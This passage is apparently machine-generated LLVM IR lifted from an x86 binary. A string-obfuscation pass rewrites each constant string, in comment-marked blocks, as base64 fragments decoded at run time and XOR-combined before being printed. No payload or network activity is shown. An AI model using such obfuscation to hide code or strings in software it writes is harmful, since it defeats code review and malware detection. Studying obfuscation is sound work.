  %fp82 = tail call i32 (i8*, ...) @printf(i8* nonnull dereferenceable(1) %21)  nobuiltin nounwind "no-builtins" , !funcname !240
;-------------------------------
; Replace: %cast82= getelementptr [1 x i8], [1 x i8]* @.str79, i64 0, i64 0
  %cipher.ptr.217 = alloca [5 x i8]
  store [5 x i8] c"\43\67\3d\3d\00", [5 x i8]* %cipher.ptr.217
  %cipher.217 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.217, i32 0, i32 0
  %plain.ptr.217 = tail call i8* @base64_decode(i8* %cipher.217)
  %spi217 = bitcast i8* %plain.ptr.217 to [1 x i8]*
  %cast82= getelementptr [1 x i8], [1 x i8]* %spi217, i64 0, i64 0
;-------------------------------
  %22 = tail call i32 (i8*, ...) @printf(i8* nonnull dereferenceable(1) %cast82)  nobuiltin nounwind "no-builtins" , !funcname !240
;-------------------------------
  store i32 %tmp2_v6.i.i, i32* %19, align 16
  store i32 134517446, i32* %20, align 4
  %arg.i.i7 = load i32, i32* %19, align 16
  %23 = inttoptr i32 %arg.i.i7 to i8*
;-------------------------------
;---Replaced puts with printf---
  %fp83 = tail call i32 (i8*, ...) @printf(i8* nonnull dereferenceable(1) %23)  nobuiltin nounwind "no-builtins" , !funcname !240
;-------------------------------
; Replace: %cast83= getelementptr [1 x i8], [1 x i8]* @.str79, i64 0, i64 0
  %cipher.ptr.218 = alloca [5 x i8]
  store [5 x i8] c"\43\67\3d\3d\00", [5 x i8]* %cipher.ptr.218
  %cipher.218 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.218, i32 0, i32 0
  %plain.ptr.218 = tail call i8* @base64_decode(i8* %cipher.218)
  %spi218 = bitcast i8* %plain.ptr.218 to [1 x i8]*
  %cast83= getelementptr [1 x i8], [1 x i8]* %spi218, i64 0, i64 0
;-------------------------------
  %24 = tail call i32 (i8*, ...) @printf(i8* nonnull dereferenceable(1) %cast83)  nobuiltin nounwind "no-builtins" , !funcname !240
;-------------------------------
  %tmp2_v.i60.i = add i32 %tmp0_v.i43.i, -264
  br label %Func_80492DE.exit.i

Func_80492DE.exit.i:                              ; preds = %Func_80492DE.exit.i, %0
  %r_edi.031 = phi i32 [ %tmp2_v.i60.i, %0 ], [ %tmp4_v3.i.i, %Func_80492DE.exit.i ]
  %r_esi.030 = phi i32 [ 134529088, %0 ], [ %tmp4_v.i9.i, %Func_80492DE.exit.i ]
  %r_ecx.029 = phi i32 [ 52, %0 ], [ %tmp4_v5.i.i, %Func_80492DE.exit.i ]
  %25 = inttoptr i32 %r_esi.030 to i32*
  %26 = load i32, i32* %25, align 4
  %27 = inttoptr i32 %r_edi.031 to i32*
  store i32 %26, i32* %27, align 4
  %tmp0_v1.i7.i = load i32, i32* @df, align 4
  %tmp0_v2.i8.i = shl i32 %tmp0_v1.i7.i, 2
  %tmp4_v.i9.i = add i32 %tmp0_v2.i8.i, %r_esi.030
  %tmp4_v3.i.i = add i32 %tmp0_v2.i8.i, %r_edi.031
  %tmp4_v5.i.i = add nsw i32 %r_ecx.029, -1
  %.not.i.i = icmp eq i32 %tmp4_v5.i.i, 0
  br i1 %.not.i.i, label %BB_80492EC.i.lr.ph, label %Func_80492DE.exit.i

BB_80492EC.i:                                     ; preds = %BB_80492EC.i.lr.ph, %BB_80492EC.i
  %28 = phi i32* [ %39, %BB_80492EC.i.lr.ph ], [ %36, %BB_80492EC.i ]
  %r_ecx.235 = phi i32 [ 0, %BB_80492EC.i.lr.ph ], [ %tmp2_v4.i72.i, %BB_80492EC.i ]
  %r_ebp.134 = phi i32 [ %tmp2_v4.i46.i, %BB_80492EC.i.lr.ph ], [ %.pn27, %BB_80492EC.i ]
  %r_ebx.133 = phi i32 [ 134529024, %BB_80492EC.i.lr.ph ], [ %.pn26, %BB_80492EC.i ]
  store i32 10, i32* %19, align 16
  store i32 134517494, i32* %20, align 4
  %arg.i.i18 = load i32, i32* %19, align 16
  %29 = tail call i32 @putchar(i32 %arg.i.i18)  nounwind 
  %tmp2_v.i3.i = add i32 %r_ebp.134, -256
  %30 = load i32, i32* %28, align 4
  %tmp15_v3.i.i = mul i32 %30, 104
  %tmp0_v5.i4.i = add i32 %tmp15_v3.i.i, %tmp2_v.i3.i
  store i32 %tmp0_v5.i4.i, i32* %40, align 4
  %tmp2_v8.i5.i = add i32 %r_ebx.133, -8147
  store i32 %tmp2_v8.i5.i, i32* %19, align 16
  store i32 134517530, i32* %20, align 4
  %31 = tail call x86_fastcallcc i64 @helper_stub_trampoline(i32 inreg noundef %r_ecx.235, i32 inreg noundef %tmp2_v.i3.i, i32 noundef %tmp2_v11.i.i, i32 noundef ptrtoint (i32 (i8*, ...)* @printf to i32))  nobuiltin nounwind "no-builtins" , !funcname !212
  %32 = load i32, i32* %28, align 4
  %tmp15_v2.i.i = mul i32 %32, 104
  %tmp2_v4.i72.i = add i32 %r_ebp.134, -24
  %tmp0_v5.i73.i = add i32 %r_ebp.134, -156
  %tmp0_v6.i74.i = add i32 %tmp0_v5.i73.i, %tmp15_v2.i.i
  %33 = inttoptr i32 %tmp0_v6.i74.i to i32*
  %34 = load i32, i32* %33, align 4
  store i32 134517556, i32* %9, align 4
  %switch6 = icmp eq i32 %34, 134517238
  %. = select i1 %switch6, i32 134517254, i32 134517301
;-------------------------------
; Replace: %spi.bis.698 = ptrtoint[16 x i8]* @str.bis.698 to i32
  %sp0.36 = alloca [16 x i8]
;-------------------------------
; Replace: store [16 x i8] c"\0F\56\3E\61\1F\2D\19\27\47\3D\5A\17\2E\06\3F\46", [16 x i8]* %sp0.36
  %sp147 = alloca [16 x i8]
  
;-------------------------------
; Replace: %s0.147 = load [2 x i8], [2 x i8]* @str.0.147
  %cipher.ptr.444 = alloca [5 x i8]
  store [5 x i8] c"\44\31\59\3d\00", [5 x i8]* %cipher.ptr.444
  %cipher.444 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.444, i32 0, i32 0
  %plain.ptr.444 = tail call i8* @base64_decode(i8* %cipher.444)
  %spi444 = bitcast i8* %plain.ptr.444 to [2 x i8]*
  %s0.147 = load [2 x i8], [2 x i8]* %spi444
;-------------------------------
  %sp0.147 = bitcast [16 x i8]* %sp147 to [2 x i8]*
  store [2 x i8] %s0.147, [2 x i8]* %sp0.147
  %next0.147 = getelementptr [16 x i8], [16 x i8]* %sp147, i32 0, i32 2
  
;-------------------------------
; Replace: %s1.147 = load [2 x i8], [2 x i8]* @str.1.147
  %cipher.ptr.443 = alloca [5 x i8]
  store [5 x i8] c"\50\6d\45\3d\00", [5 x i8]* %cipher.ptr.443
  %cipher.443 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.443, i32 0, i32 0
  %plain.ptr.443 = tail call i8* @base64_decode(i8* %cipher.443)
  %spi443 = bitcast i8* %plain.ptr.443 to [2 x i8]*
  %s1.147 = load [2 x i8], [2 x i8]* %spi443
;-------------------------------
  %sp1.147 = bitcast i8* %next0.147 to [2 x i8]*
  store [2 x i8] %s1.147, [2 x i8]* %sp1.147
  %next1.147 = getelementptr [16 x i8], [16 x i8]* %sp147, i32 0, i32 4
  
;-------------------------------
; Replace: %s2.147 = load [2 x i8], [2 x i8]* @str.2.147
  %cipher.ptr.445 = alloca [5 x i8]
  store [5 x i8] c"\48\79\30\3d\00", [5 x i8]* %cipher.ptr.445
  %cipher.445 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.445, i32 0, i32 0
  %plain.ptr.445 = tail call i8* @base64_decode(i8* %cipher.445)
  %spi445 = bitcast i8* %plain.ptr.445 to [2 x i8]*
  %s2.147 = load [2 x i8], [2 x i8]* %spi445
;-------------------------------
  %sp2.147 = bitcast i8* %next1.147 to [2 x i8]*
  store [2 x i8] %s2.147, [2 x i8]* %sp2.147
  %next2.147 = getelementptr [16 x i8], [16 x i8]* %sp147, i32 0, i32 6
  
;-------------------------------
; Replace: %s3.147 = load [2 x i8], [2 x i8]* @str.3.147
  %cipher.ptr.449 = alloca [5 x i8]
  store [5 x i8] c"\47\53\63\3d\00", [5 x i8]* %cipher.ptr.449
  %cipher.449 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.449, i32 0, i32 0
  %plain.ptr.449 = tail call i8* @base64_decode(i8* %cipher.449)
  %spi449 = bitcast i8* %plain.ptr.449 to [2 x i8]*
  %s3.147 = load [2 x i8], [2 x i8]* %spi449
;-------------------------------
  %sp3.147 = bitcast i8* %next2.147 to [2 x i8]*
  store [2 x i8] %s3.147, [2 x i8]* %sp3.147
  %next3.147 = getelementptr [16 x i8], [16 x i8]* %sp147, i32 0, i32 8
  
;-------------------------------
; Replace: %s4.147 = load [2 x i8], [2 x i8]* @str.4.147
  %cipher.ptr.447 = alloca [5 x i8]
  store [5 x i8] c"\52\7a\30\3d\00", [5 x i8]* %cipher.ptr.447
  %cipher.447 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.447, i32 0, i32 0
  %plain.ptr.447 = tail call i8* @base64_decode(i8* %cipher.447)
  %spi447 = bitcast i8* %plain.ptr.447 to [2 x i8]*
  %s4.147 = load [2 x i8], [2 x i8]* %spi447
;-------------------------------
  %sp4.147 = bitcast i8* %next3.147 to [2 x i8]*
  store [2 x i8] %s4.147, [2 x i8]* %sp4.147
  %next4.147 = getelementptr [16 x i8], [16 x i8]* %sp147, i32 0, i32 10
  
;-------------------------------
; Replace: %s5.147 = load [2 x i8], [2 x i8]* @str.5.147
  %cipher.ptr.442 = alloca [5 x i8]
  store [5 x i8] c"\57\68\63\3d\00", [5 x i8]* %cipher.ptr.442
  %cipher.442 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.442, i32 0, i32 0
  %plain.ptr.442 = tail call i8* @base64_decode(i8* %cipher.442)
  %spi442 = bitcast i8* %plain.ptr.442 to [2 x i8]*
  %s5.147 = load [2 x i8], [2 x i8]* %spi442
;-------------------------------
  %sp5.147 = bitcast i8* %next4.147 to [2 x i8]*
  store [2 x i8] %s5.147, [2 x i8]* %sp5.147
  %next5.147 = getelementptr [16 x i8], [16 x i8]* %sp147, i32 0, i32 12
  
;-------------------------------
; Replace: %s6.147 = load [2 x i8], [2 x i8]* @str.6.147
  %cipher.ptr.446 = alloca [5 x i8]
  store [5 x i8] c"\4c\67\59\3d\00", [5 x i8]* %cipher.ptr.446
  %cipher.446 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.446, i32 0, i32 0
  %plain.ptr.446 = tail call i8* @base64_decode(i8* %cipher.446)
  %spi446 = bitcast i8* %plain.ptr.446 to [2 x i8]*
  %s6.147 = load [2 x i8], [2 x i8]* %spi446
;-------------------------------
  %sp6.147 = bitcast i8* %next5.147 to [2 x i8]*
  store [2 x i8] %s6.147, [2 x i8]* %sp6.147
  %next6.147 = getelementptr [16 x i8], [16 x i8]* %sp147, i32 0, i32 14
  
;-------------------------------
; Replace: %s7.147 = load [2 x i8], [2 x i8]* @str.7.147
  %cipher.ptr.448 = alloca [5 x i8]
  store [5 x i8] c"\50\30\59\3d\00", [5 x i8]* %cipher.ptr.448
  %cipher.448 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.448, i32 0, i32 0
  %plain.ptr.448 = tail call i8* @base64_decode(i8* %cipher.448)
  %spi448 = bitcast i8* %plain.ptr.448 to [2 x i8]*
  %s7.147 = load [2 x i8], [2 x i8]* %spi448
;-------------------------------
  %sp7.147 = bitcast i8* %next6.147 to [2 x i8]*
  store [2 x i8] %s7.147, [2 x i8]* %sp7.147

  %spi147 = load [16 x i8], [16 x i8]* %sp147
  store [16 x i8] %spi147, [16 x i8]* %sp0.36
;-------------------------------
  %sp0.1.36 = bitcast [16 x i8]* %sp0.36 to i128*
  %i0.36 = load i128, i128* %sp0.1.36

  %sp1.36 = alloca [16 x i8]
;-------------------------------
; Replace: store [16 x i8] c"\6e\32\5a\41\76\43\6a\53\35\48\39\63\47\69\51\46", [16 x i8]* %sp1.36
  %sp148 = alloca [16 x i8]
  
;-------------------------------
; Replace: %s0.148 = load [2 x i8], [2 x i8]* @str.0.148
  %cipher.ptr.451 = alloca [5 x i8]
  store [5 x i8] c"\62\6a\49\3d\00", [5 x i8]* %cipher.ptr.451
  %cipher.451 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.451, i32 0, i32 0
  %plain.ptr.451 = tail call i8* @base64_decode(i8* %cipher.451)
  %spi451 = bitcast i8* %plain.ptr.451 to [2 x i8]*
  %s0.148 = load [2 x i8], [2 x i8]* %spi451
;-------------------------------
  %sp0.148 = bitcast [16 x i8]* %sp148 to [2 x i8]*
  store [2 x i8] %s0.148, [2 x i8]* %sp0.148
  %next0.148 = getelementptr [16 x i8], [16 x i8]* %sp148, i32 0, i32 2
  
;-------------------------------
; Replace: %s1.148 = load [2 x i8], [2 x i8]* @str.1.148
  %cipher.ptr.452 = alloca [5 x i8]
  store [5 x i8] c"\57\6b\45\3d\00", [5 x i8]* %cipher.ptr.452
  %cipher.452 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.452, i32 0, i32 0
  %plain.ptr.452 = tail call i8* @base64_decode(i8* %cipher.452)
  %spi452 = bitcast i8* %plain.ptr.452 to [2 x i8]*
  %s1.148 = load [2 x i8], [2 x i8]* %spi452
;-------------------------------
  %sp1.148 = bitcast i8* %next0.148 to [2 x i8]*
  store [2 x i8] %s1.148, [2 x i8]* %sp1.148
  %next1.148 = getelementptr [16 x i8], [16 x i8]* %sp148, i32 0, i32 4
  
;-------------------------------
; Replace: %s2.148 = load [2 x i8], [2 x i8]* @str.2.148
  %cipher.ptr.450 = alloca [5 x i8]
  store [5 x i8] c"\64\6b\4d\3d\00", [5 x i8]* %cipher.ptr.450
  %cipher.450 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.450, i32 0, i32 0
  %plain.ptr.450 = tail call i8* @base64_decode(i8* %cipher.450)
  %spi450 = bitcast i8* %plain.ptr.450 to [2 x i8]*
  %s2.148 = load [2 x i8], [2 x i8]* %spi450
;-------------------------------
  %sp2.148 = bitcast i8* %next1.148 to [2 x i8]*
  store [2 x i8] %s2.148, [2 x i8]* %sp2.148
  %next2.148 = getelementptr [16 x i8], [16 x i8]* %sp148, i32 0, i32 6
  
;-------------------------------
; Replace: %s3.148 = load [2 x i8], [2 x i8]* @str.3.148
  %cipher.ptr.454 = alloca [5 x i8]
  store [5 x i8] c"\61\6c\4d\3d\00", [5 x i8]* %cipher.ptr.454
  %cipher.454 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.454, i32 0, i32 0
  %plain.ptr.454 = tail call i8* @base64_decode(i8* %cipher.454)
  %spi454 = bitcast i8* %plain.ptr.454 to [2 x i8]*
  %s3.148 = load [2 x i8], [2 x i8]* %spi454
;-------------------------------
  %sp3.148 = bitcast i8* %next2.148 to [2 x i8]*
  store [2 x i8] %s3.148, [2 x i8]* %sp3.148
  %next3.148 = getelementptr [16 x i8], [16 x i8]* %sp148, i32 0, i32 8
  
;-------------------------------
; Replace: %s4.148 = load [2 x i8], [2 x i8]* @str.4.148
  %cipher.ptr.456 = alloca [5 x i8]
  store [5 x i8] c"\4e\55\67\3d\00", [5 x i8]* %cipher.ptr.456
  %cipher.456 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.456, i32 0, i32 0
  %plain.ptr.456 = tail call i8* @base64_decode(i8* %cipher.456)
  %spi456 = bitcast i8* %plain.ptr.456 to [2 x i8]*
  %s4.148 = load [2 x i8], [2 x i8]* %spi456
;-------------------------------
  %sp4.148 = bitcast i8* %next3.148 to [2 x i8]*
  store [2 x i8] %s4.148, [2 x i8]* %sp4.148
  %next4.148 = getelementptr [16 x i8], [16 x i8]* %sp148, i32 0, i32 10
  
;-------------------------------
; Replace: %s5.148 = load [2 x i8], [2 x i8]* @str.5.148
  %cipher.ptr.457 = alloca [5 x i8]
  store [5 x i8] c"\4f\57\4d\3d\00", [5 x i8]* %cipher.ptr.457
  %cipher.457 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.457, i32 0, i32 0
  %plain.ptr.457 = tail call i8* @base64_decode(i8* %cipher.457)
  %spi457 = bitcast i8* %plain.ptr.457 to [2 x i8]*
  %s5.148 = load [2 x i8], [2 x i8]* %spi457
;-------------------------------
  %sp5.148 = bitcast i8* %next4.148 to [2 x i8]*
  store [2 x i8] %s5.148, [2 x i8]* %sp5.148
  %next5.148 = getelementptr [16 x i8], [16 x i8]* %sp148, i32 0, i32 12
  
;-------------------------------
; Replace: %s6.148 = load [2 x i8], [2 x i8]* @str.6.148
  %cipher.ptr.453 = alloca [5 x i8]
  store [5 x i8] c"\52\32\6b\3d\00", [5 x i8]* %cipher.ptr.453
  %cipher.453 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.453, i32 0, i32 0
  %plain.ptr.453 = tail call i8* @base64_decode(i8* %cipher.453)
  %spi453 = bitcast i8* %plain.ptr.453 to [2 x i8]*
  %s6.148 = load [2 x i8], [2 x i8]* %spi453
;-------------------------------
  %sp6.148 = bitcast i8* %next5.148 to [2 x i8]*
  store [2 x i8] %s6.148, [2 x i8]* %sp6.148
  %next6.148 = getelementptr [16 x i8], [16 x i8]* %sp148, i32 0, i32 14
  
;-------------------------------
; Replace: %s7.148 = load [2 x i8], [2 x i8]* @str.7.148
  %cipher.ptr.455 = alloca [5 x i8]
  store [5 x i8] c"\55\55\59\3d\00", [5 x i8]* %cipher.ptr.455
  %cipher.455 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.455, i32 0, i32 0
  %plain.ptr.455 = tail call i8* @base64_decode(i8* %cipher.455)
  %spi455 = bitcast i8* %plain.ptr.455 to [2 x i8]*
  %s7.148 = load [2 x i8], [2 x i8]* %spi455
;-------------------------------
  %sp7.148 = bitcast i8* %next6.148 to [2 x i8]*
  store [2 x i8] %s7.148, [2 x i8]* %sp7.148

  %spi148 = load [16 x i8], [16 x i8]* %sp148
  store [16 x i8] %spi148, [16 x i8]* %sp1.36
;-------------------------------
  %sp1.1.36 = bitcast [16 x i8]* %sp1.36 to i128*
  %i1.36 = load i128, i128* %sp1.1.36

  %xp36 = xor i128 %i0.36, %i1.36

  %fi.36 = alloca i128
  store i128 %xp36, i128* %fi.36

  %spi36 = bitcast i128* %fi.36 to [16 x i8]*
  %spi.bis.698 = ptrtoint[16 x i8]* %spi36 to i32
;-------------------------------
;-------------------------------
; Replace: %spi.bis.699 = ptrtoint[21 x i8]* @str.bis.699 to i32
  %sp0.37 = alloca [21 x i8]
;-------------------------------
; Replace: store [21 x i8] c"\46\31\26\17\08\56\22\27\79\3D\0A\02\26\3F\05\10\35\31\0E\22\51", [21 x i8]* %sp0.37
  %sp149 = alloca [21 x i8]
  
;-------------------------------
; Replace: %s0.149 = load [2 x i8], [2 x i8]* @str.0.149
  %cipher.ptr.462 = alloca [5 x i8]
  store [5 x i8] c"\52\6a\45\3d\00", [5 x i8]* %cipher.ptr.462
  %cipher.462 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.462, i32 0, i32 0
  %plain.ptr.462 = tail call i8* @base64_decode(i8* %cipher.462)
  %spi462 = bitcast i8* %plain.ptr.462 to [2 x i8]*
  %s0.149 = load [2 x i8], [2 x i8]* %spi462
;-------------------------------
  %sp0.149 = bitcast [21 x i8]* %sp149 to [2 x i8]*
  store [2 x i8] %s0.149, [2 x i8]* %sp0.149
  %next0.149 = getelementptr [21 x i8], [21 x i8]* %sp149, i32 0, i32 2
  
;-------------------------------
; Replace: %s1.149 = load [3 x i8], [3 x i8]* @str.1.149
  %cipher.ptr.464 = alloca [5 x i8]
  store [5 x i8] c"\4a\68\63\49\00", [5 x i8]* %cipher.ptr.464
  %cipher.464 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.464, i32 0, i32 0
  %plain.ptr.464 = tail call i8* @base64_decode(i8* %cipher.464)
  %spi464 = bitcast i8* %plain.ptr.464 to [3 x i8]*
  %s1.149 = load [3 x i8], [3 x i8]* %spi464
;-------------------------------
  %sp1.149 = bitcast i8* %next0.149 to [3 x i8]*
  store [3 x i8] %s1.149, [3 x i8]* %sp1.149
  %next1.149 = getelementptr [21 x i8], [21 x i8]* %sp149, i32 0, i32 5
  
;-------------------------------
; Replace: %s2.149 = load [2 x i8], [2 x i8]* @str.2.149
  %cipher.ptr.465 = alloca [5 x i8]
  store [5 x i8] c"\56\69\49\3d\00", [5 x i8]* %cipher.ptr.465
  %cipher.465 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.465, i32 0, i32 0
  %plain.ptr.465 = tail call i8* @base64_decode(i8* %cipher.465)
  %spi465 = bitcast i8* %plain.ptr.465 to [2 x i8]*
  %s2.149 = load [2 x i8], [2 x i8]* %spi465
;-------------------------------
  %sp2.149 = bitcast i8* %next1.149 to [2 x i8]*
  store [2 x i8] %s2.149, [2 x i8]* %sp2.149
  %next2.149 = getelementptr [21 x i8], [21 x i8]* %sp149, i32 0, i32 7
  
;-------------------------------
; Replace: %s3.149 = load [3 x i8], [3 x i8]* @str.3.149
  %cipher.ptr.461 = alloca [5 x i8]
  store [5 x i8] c"\4a\33\6b\39\00", [5 x i8]* %cipher.ptr.461
  %cipher.461 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.461, i32 0, i32 0
  %plain.ptr.461 = tail call i8* @base64_decode(i8* %cipher.461)
  %spi461 = bitcast i8* %plain.ptr.461 to [3 x i8]*
  %s3.149 = load [3 x i8], [3 x i8]* %spi461
;-------------------------------
  %sp3.149 = bitcast i8* %next2.149 to [3 x i8]*
  store [3 x i8] %s3.149, [3 x i8]* %sp3.149
  %next3.149 = getelementptr [21 x i8], [21 x i8]* %sp149, i32 0, i32 10
  
;-------------------------------
; Replace: %s4.149 = load [3 x i8], [3 x i8]* @str.4.149
  %cipher.ptr.459 = alloca [5 x i8]
  store [5 x i8] c"\43\67\49\6d\00", [5 x i8]* %cipher.ptr.459
  %cipher.459 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.459, i32 0, i32 0
  %plain.ptr.459 = tail call i8* @base64_decode(i8* %cipher.459)
  %spi459 = bitcast i8* %plain.ptr.459 to [3 x i8]*
  %s4.149 = load [3 x i8], [3 x i8]* %spi459
;-------------------------------
  %sp4.149 = bitcast i8* %next3.149 to [3 x i8]*
  store [3 x i8] %s4.149, [3 x i8]* %sp4.149
  %next4.149 = getelementptr [21 x i8], [21 x i8]* %sp149, i32 0, i32 13
  
;-------------------------------
; Replace: %s5.149 = load [2 x i8], [2 x i8]* @str.5.149
  %cipher.ptr.458 = alloca [5 x i8]
  store [5 x i8] c"\50\77\55\3d\00", [5 x i8]* %cipher.ptr.458
  %cipher.458 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.458, i32 0, i32 0
  %plain.ptr.458 = tail call i8* @base64_decode(i8* %cipher.458)
  %spi458 = bitcast i8* %plain.ptr.458 to [2 x i8]*
  %s5.149 = load [2 x i8], [2 x i8]* %spi458
;-------------------------------
  %sp5.149 = bitcast i8* %next4.149 to [2 x i8]*
  store [2 x i8] %s5.149, [2 x i8]* %sp5.149
  %next5.149 = getelementptr [21 x i8], [21 x i8]* %sp149, i32 0, i32 15
  
;-------------------------------
; Replace: %s6.149 = load [3 x i8], [3 x i8]* @str.6.149
  %cipher.ptr.460 = alloca [5 x i8]
  store [5 x i8] c"\45\44\55\78\00", [5 x i8]* %cipher.ptr.460
  %cipher.460 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.460, i32 0, i32 0
  %plain.ptr.460 = tail call i8* @base64_decode(i8* %cipher.460)
  %spi460 = bitcast i8* %plain.ptr.460 to [3 x i8]*
  %s6.149 = load [3 x i8], [3 x i8]* %spi460
;-------------------------------
  %sp6.149 = bitcast i8* %next5.149 to [3 x i8]*
  store [3 x i8] %s6.149, [3 x i8]* %sp6.149
  %next6.149 = getelementptr [21 x i8], [21 x i8]* %sp149, i32 0, i32 18
  
;-------------------------------
; Replace: %s7.149 = load [3 x i8], [3 x i8]* @str.7.149
  %cipher.ptr.463 = alloca [5 x i8]
  store [5 x i8] c"\44\69\4a\52\00", [5 x i8]* %cipher.ptr.463
  %cipher.463 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.463, i32 0, i32 0
  %plain.ptr.463 = tail call i8* @base64_decode(i8* %cipher.463)
  %spi463 = bitcast i8* %plain.ptr.463 to [3 x i8]*
  %s7.149 = load [3 x i8], [3 x i8]* %spi463
;-------------------------------
  %sp7.149 = bitcast i8* %next6.149 to [3 x i8]*
  store [3 x i8] %s7.149, [3 x i8]* %sp7.149

  %spi149 = load [21 x i8], [21 x i8]* %sp149
  store [21 x i8] %spi149, [21 x i8]* %sp0.37
;-------------------------------
  %sp0.1.37 = bitcast [21 x i8]* %sp0.37 to i168*
  %i0.37 = load i168, i168* %sp0.1.37

  %sp1.37 = alloca [21 x i8]
;-------------------------------
; Replace: store [21 x i8] c"\35\44\44\63\7a\37\41\53\59\54\64\71\52\4d\70\73\41\58\61\4c\51", [21 x i8]* %sp1.37
  %sp150 = alloca [21 x i8]
  
;-------------------------------
; Replace: %s0.150 = load [2 x i8], [2 x i8]* @str.0.150
  %cipher.ptr.470 = alloca [5 x i8]
  store [5 x i8] c"\4e\55\51\3d\00", [5 x i8]* %cipher.ptr.470
  %cipher.470 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.470, i32 0, i32 0
  %plain.ptr.470 = tail call i8* @base64_decode(i8* %cipher.470)
  %spi470 = bitcast i8* %plain.ptr.470 to [2 x i8]*
  %s0.150 = load [2 x i8], [2 x i8]* %spi470
;-------------------------------
  %sp0.150 = bitcast [21 x i8]* %sp150 to [2 x i8]*
  store [2 x i8] %s0.150, [2 x i8]* %sp0.150
  %next0.150 = getelementptr [21 x i8], [21 x i8]* %sp150, i32 0, i32 2
  
;-------------------------------
; Replace: %s1.150 = load [3 x i8], [3 x i8]* @str.1.150
  %cipher.ptr.467 = alloca [5 x i8]
  store [5 x i8] c"\52\47\4e\36\00", [5 x i8]* %cipher.ptr.467
  %cipher.467 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.467, i32 0, i32 0
  %plain.ptr.467 = tail call i8* @base64_decode(i8* %cipher.467)
  %spi467 = bitcast i8* %plain.ptr.467 to [3 x i8]*
  %s1.150 = load [3 x i8], [3 x i8]* %spi467
;-------------------------------
  %sp1.150 = bitcast i8* %next0.150 to [3 x i8]*
  store [3 x i8] %s1.150, [3 x i8]* %sp1.150
  %next1.150 = getelementptr [21 x i8], [21 x i8]* %sp150, i32 0, i32 5
  
;-------------------------------
; Replace: %s2.150 = load [2 x i8], [2 x i8]* @str.2.150
  %cipher.ptr.466 = alloca [5 x i8]
  store [5 x i8] c"\4e\30\45\3d\00", [5 x i8]* %cipher.ptr.466
  %cipher.466 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.466, i32 0, i32 0
  %plain.ptr.466 = tail call i8* @base64_decode(i8* %cipher.466)
  %spi466 = bitcast i8* %plain.ptr.466 to [2 x i8]*
  %s2.150 = load [2 x i8], [2 x i8]* %spi466
;-------------------------------
  %sp2.150 = bitcast i8* %next1.150 to [2 x i8]*
  store [2 x i8] %s2.150, [2 x i8]* %sp2.150
  %next2.150 = getelementptr [21 x i8], [21 x i8]* %sp150, i32 0, i32 7
  
;-------------------------------
; Replace: %s3.150 = load [3 x i8], [3 x i8]* @str.3.150
  %cipher.ptr.472 = alloca [5 x i8]
  store [5 x i8] c"\55\31\6c\55\00", [5 x i8]* %cipher.ptr.472
  %cipher.472 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.472, i32 0, i32 0
  %plain.ptr.472 = tail call i8* @base64_decode(i8* %cipher.472)
  %spi472 = bitcast i8* %plain.ptr.472 to [3 x i8]*
  %s3.150 = load [3 x i8], [3 x i8]* %spi472
;-------------------------------
  %sp3.150 = bitcast i8* %next2.150 to [3 x i8]*
  store [3 x i8] %s3.150, [3 x i8]* %sp3.150
  %next3.150 = getelementptr [21 x i8], [21 x i8]* %sp150, i32 0, i32 10
  
;-------------------------------
; Replace: %s4.150 = load [3 x i8], [3 x i8]* @str.4.150
  %cipher.ptr.471 = alloca [5 x i8]
  store [5 x i8] c"\5a\48\46\53\00", [5 x i8]* %cipher.ptr.471
  %cipher.471 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.471, i32 0, i32 0
  %plain.ptr.471 = tail call i8* @base64_decode(i8* %cipher.471)
  %spi471 = bitcast i8* %plain.ptr.471 to [3 x i8]*
  %s4.150 = load [3 x i8], [3 x i8]* %spi471
;-------------------------------
  %sp4.150 = bitcast i8* %next3.150 to [3 x i8]*
  store [3 x i8] %s4.150, [3 x i8]* %sp4.150
  %next4.150 = getelementptr [21 x i8], [21 x i8]* %sp150, i32 0, i32 13
  
;-------------------------------
; Replace: %s5.150 = load [2 x i8], [2 x i8]* @str.5.150
  %cipher.ptr.473 = alloca [5 x i8]
  store [5 x i8] c"\54\58\41\3d\00", [5 x i8]* %cipher.ptr.473
  %cipher.473 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.473, i32 0, i32 0
  %plain.ptr.473 = tail call i8* @base64_decode(i8* %cipher.473)
  %spi473 = bitcast i8* %plain.ptr.473 to [2 x i8]*
  %s5.150 = load [2 x i8], [2 x i8]* %spi473
;-------------------------------
  %sp5.150 = bitcast i8* %next4.150 to [2 x i8]*
  store [2 x i8] %s5.150, [2 x i8]* %sp5.150
  %next5.150 = getelementptr [21 x i8], [21 x i8]* %sp150, i32 0, i32 15
  
;-------------------------------
; Replace: %s6.150 = load [3 x i8], [3 x i8]* @str.6.150
